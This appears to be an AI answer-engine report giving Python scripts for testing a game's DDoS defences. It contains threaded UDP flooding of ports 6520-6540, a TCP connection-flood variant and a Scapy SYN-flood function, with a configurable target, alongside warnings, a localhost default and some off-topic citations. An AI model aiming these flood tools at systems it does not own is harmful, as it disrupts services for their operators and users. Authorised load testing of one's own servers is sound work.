<img src="https://r2cdn.perplexity.ai/pplx-full-logo-primary-dark%402x.png" class="logo" width="120"/>

# 

---

# Port Flooding Test Script for Game DDoS Prevention Testing

This detailed report provides a Python script for testing a game's DDoS prevention capabilities by generating moderate traffic to local ports 6520-6540. The script is designed specifically for educational and testing purposes.

## Understanding Port Flooding Tests

Port flooding tests involve sending controlled amounts of network traffic to specific ports to evaluate how applications handle increased load. For game developers, such testing is crucial to ensure their DDoS prevention mechanisms function properly before deployment[^4][^9].

### Technical Implementation

The script below uses UDP packets to flood the specified port range (6520-6540) with configurable traffic. It employs threading to send traffic to multiple ports simultaneously while providing controls for packet size, traffic rate, and test duration.

```python
#!/usr/bin/env python3
"""
Port Flooding Test Script

This script generates moderate traffic to test game DDoS prevention.
For EDUCATIONAL PURPOSES ONLY. Use only on systems you own or have permission to test.
"""

import socket
import threading
import time
import random
import argparse
from concurrent.futures import ThreadPoolExecutor

def flood_port(target_ip, port, packet_size, duration, delay):
    """Send traffic to a specific port on the target IP."""
    end_time = time.time() + duration
    packet = b"X" * packet_size  # Create a simple packet filled with "X"
    
    try:
        # Create a UDP socket connection
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        packets_sent = 0
        print(f"Starting traffic to {target_ip}:{port}")
        
        while time.time() < end_time:
            try:
                sock.sendto(packet, (target_ip, port))
                packets_sent += 1
                time.sleep(delay)  # Control the packet rate
            except Exception as e:
                print(f"Error sending to {port}: {e}")
                break
                
        print(f"Completed sending {packets_sent} packets to {target_ip}:{port}")
        
    except Exception as e:
        print(f"Error creating socket for {port}: {e}")
    finally:
        sock.close()

def main():
    parser = argparse.ArgumentParser(
        description="Game port flood testing tool",
        epilog="EDUCATIONAL USE ONLY: Test only on your own systems."
    )
    
    parser.add_argument("--target", default="127.0.0.1", help="Target IP address (default: 127.0.0.1)")
    parser.add_argument("--port-start", type=int, default=6520, help="Starting port (default: 6520)")
    parser.add_argument("--port-end", type=int, default=6540, help="Ending port (default: 6540)")
    parser.add_argument("--packet-size", type=int, default=1024, help="Packet size in bytes (default: 1024)")
    parser.add_argument("--duration", type=int, default=30, help="Test duration in seconds (default: 30)")
    parser.add_argument("--threads", type=int, default=5, help="Number of concurrent threads (default: 5)")
    parser.add_argument("--delay", type=float, default=0.01, help="Delay between packets in seconds (default: 0.01)")
    
    args = parser.parse_args()
    
    if args.port_start > args.port_end:
        parser.error("port-start must be less than or equal to port-end")
        
    # Print warning and confirmation
    print("\n" + "="*80)
    print("WARNING: This script generates network traffic for testing purposes only.")
    print("It should ONLY be used on systems you own or have permission to test.")
    print("="*80 + "\n")
    
    confirm = input("Do you want to continue? (y/n): ").lower()
    if confirm != 'y':
        print("Test aborted.")
        return
    
    print(f"\nStarting traffic test to {args.target} ports {args.port_start}-{args.port_end}")
    print(f"Packet size: {args.packet_size} bytes, Duration: {args.duration} seconds")
    print(f"Using {args.threads} concurrent threads with {args.delay}s delay between packets\n")
    
    ports = list(range(args.port_start, args.port_end + 1))
    
    try:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            for port in ports:
                executor.submit(
                    flood_port, 
                    args.target, 
                    port, 
                    args.packet_size, 
                    args.duration, 
                    args.delay
                )
        
        print("\nTraffic test completed for all ports.")
        
    except KeyboardInterrupt:
        print("\nTest interrupted by user. Stopping...")
    
if __name__ == "__main__":
    main()
```


## Usage Instructions

1. Save the script to a file (e.g., `port_flood_test.py`)
2. Install required dependencies (standard Python libraries only)
3. Run with default parameters: `python port_flood_test.py`
4. For customization: `python port_flood_test.py --target 127.0.0.1 --port-start 6520 --port-end 6540 --packet-size 1024 --duration 60 --threads 10 --delay 0.005`

### Parameter Explanation

- `--target`: IP address to send traffic to (default: 127.0.0.1)
- `--port-start` and `--port-end`: The range of ports to test (default: 6520-6540)
- `--packet-size`: Size of each packet in bytes (default: 1024)
- `--duration`: How long to run the test in seconds (default: 30)
- `--threads`: Number of concurrent threads (default: 5)
- `--delay`: Delay between packets in seconds (default: 0.01)


## Alternative Approaches

### TCP Flooding

If your game primarily uses TCP connections, you may want to use a TCP-based flood test instead. The following modification to the `flood_port` function implements TCP flooding:

```python
def flood_port_tcp(target_ip, port, packet_size, duration, delay):
    """Send TCP traffic to a specific port."""
    end_time = time.time() + duration
    packet = b"X" * packet_size
    
    print(f"Starting TCP traffic to {target_ip}:{port}")
    packets_sent = 0
    
    while time.time() < end_time:
        try:
            # Create a new TCP socket for each connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)  # Set timeout for connection attempts
            sock.connect((target_ip, port))
            sock.send(packet)
            packets_sent += 1
            sock.close()
            time.sleep(delay)
        except:
            pass
            
    print(f"Completed sending {packets_sent} TCP packets to {target_ip}:{port}")
```


### SYN Flooding Test

For testing SYN flood protection specifically, you can use Scapy to create custom SYN packets[^1]:

```python
# This requires: pip install scapy
from scapy.all import *

def syn_flood(target_ip, port, duration):
    """Send SYN packets without completing handshake."""
    end_time = time.time() + duration
    
    # Forge IP and TCP layers
    ip = IP(dst=target_ip)
    tcp = TCP(sport=RandShort(), dport=port, flags="S")
    raw = Raw(b"X"*1024)  # Add payload
    packet = ip / tcp / raw
    
    print(f"Starting SYN flood to {target_ip}:{port}")
    send(packet, loop=1, verbose=0, inter=0.01, count=int(duration/0.01))
    print(f"Completed SYN flood to {target_ip}:{port}")
```


## Safety Considerations and Best Practices

When conducting flood testing, consider these important guidelines:

1. **Only test on your own systems**: Never test on networks or systems without explicit permission[^2][^6].
2. **Start with low traffic volumes**: Begin with minimal settings and gradually increase to avoid unintended disruptions[^7].
3. **Monitor system resources**: Keep an eye on CPU, memory, and network usage during testing.
4. **Use controlled environments**: Perform tests in isolated development environments when possible[^4].
5. **Implement safeguards**: Set appropriate limits on test duration and traffic volume[^3].

## Conclusion

This port flooding script provides a practical tool for game developers to test their DDoS prevention mechanisms. By generating moderate traffic to ports 6520-6540, developers can evaluate how their game handles increased network load and fine-tune their protection strategies.

Remember that this script is intended strictly for educational and testing purposes on systems you own or have permission to test. Responsible testing is essential for developing robust network applications without causing harm to others.

<div style="text-align: center">⁂</div>

[^1]: https://thepythoncode.com/article/syn-flooding-attack-using-scapy-in-python

[^2]: https://www.elifulkerson.com/projects/python-udp-stress-tester.php

[^3]: https://github.com/ricardojoserf/ddos_simulation

[^4]: https://www.nimbusddos.com/ddos-wargames.htm

[^5]: https://docs.faucet.nz/en/1.8.18/_modules/faucet/valve_flood.html

[^6]: https://github.com/DigvijayBhosale1729/Local_DOS_Flood

[^7]: https://github.com/olegleyz/socket-disturber

[^8]: https://www.youtube.com/watch?v=KlBl7PRico8

[^9]: https://aws.amazon.com/blogs/gametech/how-to-defend-your-games-against-ddos-attacks/

[^10]: https://documentation.extremenetworks.com/switchengine_commands_32.3/GUID-61F79CF6-17EA-47AE-860F-093947F634D6.shtml

[^11]: https://www.businessinsider.com/udp-flooding-how-to-kick-a-local-user-off-the-network-2012-1

[^12]: https://sourceforge.net/projects/pynuker/

[^13]: https://www.neuralnine.com/code-a-ddos-script-in-python/

[^14]: https://www.ovhcloud.com/en-ca/security/game-ddos-protection/

[^15]: https://unix.stackexchange.com/questions/769702/too-fast-checking-local-ports-with-python-socket

[^16]: https://www.youtube.com/watch?v=EQVX_6VhjzM

[^17]: https://github.com/mach1el/pyddos

[^18]: https://www.keysight.com/us/en/cmp/topics/ddos-testing.html

[^19]: https://stackoverflow.com/questions/1365265/on-localhost-how-do-i-pick-a-free-port-number

[^20]: https://gist.github.com/mda590/7a9a6b21b74ae10aa350b1703e2724a0

[^21]: https://www.reddit.com/r/learnpython/comments/1aew1jl/i_need_a_ddos_python_script/

[^22]: https://aws-experience.com/emea/de-central-growth/e/9c2fb/test-your-skills-on-a-ddos-game-day

[^23]: https://serverfault.com/questions/1022278/detect-syn-flood-attack-in-python

[^24]: https://www.speedguide.net/port.php?port=6540

[^25]: https://security.stackexchange.com/questions/231455/does-flooding-with-bytes-cause-buffer-overflow

[^26]: https://i.dell.com/sites/csdocuments/Shared-Content_data-Sheets_Documents/en/us/Brocade-6520-Fibre-Channel-Switch-Data-Sheet.pdf

[^27]: https://supplyshop.com/products/copy-of-python-6525-7-8-brass-flare-elbow-1

